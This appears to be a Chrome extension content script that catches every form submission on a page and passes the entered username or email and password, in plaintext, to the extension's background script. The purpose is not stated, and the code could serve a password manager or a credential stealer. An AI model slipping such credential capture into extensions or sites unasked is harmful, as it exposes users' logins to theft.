// Listen for form submissions on the webpage
document.addEventListener('submit', function(event) {
    // Prevent the form from submitting immediately
    // event.preventDefault(); // Uncomment this if you need to stop the form submission for testing

    // Get the form data
    let formData = new FormData(event.target);
    let username = formData.get('username'); // Assumes there's an input field named 'username'
    let email = formData.get('email'); // Assumes there's an input field named 'email'
    let password = formData.get('password'); // Assumes there's an input field named 'password'

    // Determine what data to send based on what's available
    let accountIdentifier = email ? email : username;

    // Send message to background script with the captured data
    if (accountIdentifier && password) {
        chrome.runtime.sendMessage({
            action: "loginDetected",
            account: accountIdentifier,
            password: password
        });
    }
}, true);
